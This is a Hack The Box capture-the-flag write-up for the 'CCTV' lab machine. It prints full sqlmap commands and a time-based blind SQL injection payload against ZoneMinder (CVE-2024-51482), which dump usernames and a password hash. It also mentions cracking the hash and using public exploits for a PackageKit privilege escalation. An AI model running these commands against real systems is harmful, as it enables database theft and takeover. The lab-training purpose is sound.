---
layout: post
title: "Write-up máy CCTV"
date: 2026-08-10
---
# WRITE UP CCTV - HTB MACHINE
## MY MAIN IDEA AND WALKTHROUGH
### Step 1. First of all, we need to connect with the VPN from HTB, using the command: ```sudo openvpn <FILE_NAME>.ovpn```
Because the `CCTV machine` is currently locked for `VIP+ user` so I cannot access this machine or resolve it. I could only write this Write-up by using my memory and what I noted when I solved this machine.

![alt text](images/image.png)

### Step 2. Scanning with `nmap`
One of the most powerful tools for scanning `ports` from a target IP address is `nmap`. My first step is scanning target IP address with `nmap` to find open `ports`:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Step 3. Checking website
From `nmap` scan result, my next approach is checking the target IP address website: `http://cctv.htb/zm/` which required a `username` and `password` to log in.

I tried with `username:admin` and `password:admin` and luckily it is correct.

I saw table and a search bar so I thought about `SQLi`. Searching on the internet, I found that if the website version is older than version `1.37.64` could be exploited by `SQLi` as I thought (`CVE-2024–51482`). You can find information about `CVE-2024–51482` on this website: 

`https://sploitus.com/exploit?id=BBFABA9F-EA49-5BC3-90BB-6324CC90206A&__cf_chl_f_tk=.y5HOH9PbsumqTS2C4fueknMTxcdaa9Zax_0We8EVW0-1783344908-1.0.1.1-Q.PxgSNb5X87eM1kaTRxpShyoqjUQhOaREmZsuL25yk`

### Step 4. Exploiting website

I used `sqlmap`, a powerful tool which could be used in this CVE:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=m9m7rdlfbcersi08u7mbfu44ve" \
-p tid --dbms=mysql --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.4#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:42:03 /2026-07-06/

[20:42:04] [INFO] testing connection to the target URL
[20:42:05] [INFO] checking if the target is protected by some

...<SNIP>...

---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 9805 FROM (SELECT(SLEEP(5)))wYcp)
---
[20:43:32] [INFO] the back-end DBMS is MySQL
[20:43:32] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (StarRocks fork)
[20:43:36] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 58 times
[20:43:36] [INFO] fetched data logged to text files under '/home/admin/.local/share/sqlmap/output/cctv.htb'

[*] ending @ 20:43:36 /2026-07-06/
```

`sqlmap` showed me the `usable payload`: 

`Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 9805 FROM (SELECT(SLEEP(5)))wYcp)`

Using this payload I could check, enum and extract many important infomation from many tables in backend server:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=spoe53r38m3n8f74m04bajfgm9" \
-p tid --dbms=mysql --batch --dbs

available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=kbq3aqafirj903lsmue9jchpvh" \
-p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump

| Username   |
+------------+
| admin      |
| mark       |
| superadmin |
```

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=l2aneg8ks1s0obqapc2fpmpbp2" \
-p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
Password             
+--------------------------------------------------------------+
| $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
```

### Step 5. User flag
After exploiting process, I had the hash form of user `Mark`'s password. `Mark`'s password is hashed by `bcrypt`. You could use many tools such as `hashcat` or `john the ripper` to `crack` the password and accessed the backend server using `Mark`'s account.
We could easily find `user flag` in `/home/mark`'s folder

### Step 6. Privilege Escalation

- `linpeas.sh` is a powerful tool which could scan the `Linux` backend server and find weak points to perform Privilege Escalation.
- I used `curl` on the backend server and `python3 -m http.server` on my PC to upload `linpeas.sh` on server. 
- The scanning result showed that this server could be exploited by `CVE-2026-41651 (Pack2TheRoot)`:

```bash
Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
PackageKit version detected: 1.2.8
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8 is in the vulnerable range >=1.0.2 <=1.3.4
```

- There are many `public PoC` on the internet about this CVE and you could download one, upload it on server and exploit
- The payload file worked and I performed `Privilege Escalation` successfully.

### Step 7. Root flag
With `root` privilege, I could find `root flag` in `/root` folder.

## THING I LEARNT AFTER THIS LAB:
- Do not spend too much time on web enum/fuzzing step
- But fuzzing is an important step to find hidden things =))))
- After solving about 03 labs, I think I know what kind of `web fuzzing` I have to do first to gain helpful things
- `curl` sometimes shows things that are not visible on the website.
- Writing Write-up quickly before HTB locks the machine =))))
- Trust the process